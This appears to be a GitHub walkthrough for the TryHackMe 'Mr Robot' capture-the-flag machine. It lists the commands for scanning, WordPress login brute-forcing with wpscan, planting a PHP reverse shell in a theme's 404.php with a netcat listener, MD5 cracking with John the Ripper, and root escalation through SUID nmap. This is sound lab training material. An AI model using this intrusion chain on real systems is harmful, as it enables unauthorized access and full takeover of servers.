# MRrobotCTF
#created this repo as a guide to mrrobot CTF/Vuln machine follow the steps have fun !
QMARK CTF



Steps:

#download the vpn file to connect tryhackme server

#save in desktop 

#open terminal in the folder and type command [sudo openvpn filename.octozion.ovpn]     //if you dont have openvpn installed follow this link https://openvpn.net/community-resources/installing-openvpn/

#Join the room

#Task 1:instructions 

#Task2 :

    KEY1 & 2 & 3 :
    #Cope the IP Address to the clipboard
    #Open terminal  make a folder to work with this CTF using the command [mkdir]
    #Run nmap on the ip address [sudo nmap -sV -A -sC 10.10.44.213 | tee nmapout.txt ]       //network scan and storing the result in nmapout.txt
    #Port  80 is open
    #Use burp suit > proxy > open browser > intercept off and paste the ip address
    #Use gobuster with the wordlist downloaded from my githum [sudo gobuster -u http://10.10.44.213/ dir -w wordlistgobuster.txt -x .txt | tee gobusterout.txt]
    #Found /wp-admin , robots.txt
    #check both the url
    #on checking robots.txt you'll get they open the [IP/key-1-of-3.txt] **1st key**
    
    #Use wp-scan [ sudo wpscan --url 10.10.35.137 --passwords simplefsociety.txt -U simplefsociety.txt ]
    #Download the shell https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
    #inside wp dashboard go to  appreance and editor
    #edit in 404.php code ane save and use netcat [nc -lvnp 1234 ]
    #To make the session more stabel [ python -c 'import pty;pty.spawn("/bin/bash")' ]
    #now to goto /home/robot two file now use command [cat password.raw-md5 ]
    #copy the md5 has and use john the ripper and save as mrrobot.hash
    #use john the ripper tool   [sudo john mrrobot.hash --wordlist=simplefsociety.txt --format=Raw-MD5]
    #got the password abcdefghijklmnopqrstuvwxyz
    #type su robot and type the password and cat the **2nd key**
    
    #use the command [find / -perm +6000 2>/dev/null | grep '/bin'] which checks the privilage excaltion to goto root
    #nmap is inside it 
    #now use https://gtfobins.github.io/gtfobins/nmap/	to  get the command for privillage excalation
    #nmap --interactive     //command to shift nmap interactive mode
    #nmap> !sh      //command to shit root
    # ls /root/     //gives the third key
    # cat the final **3rd key**
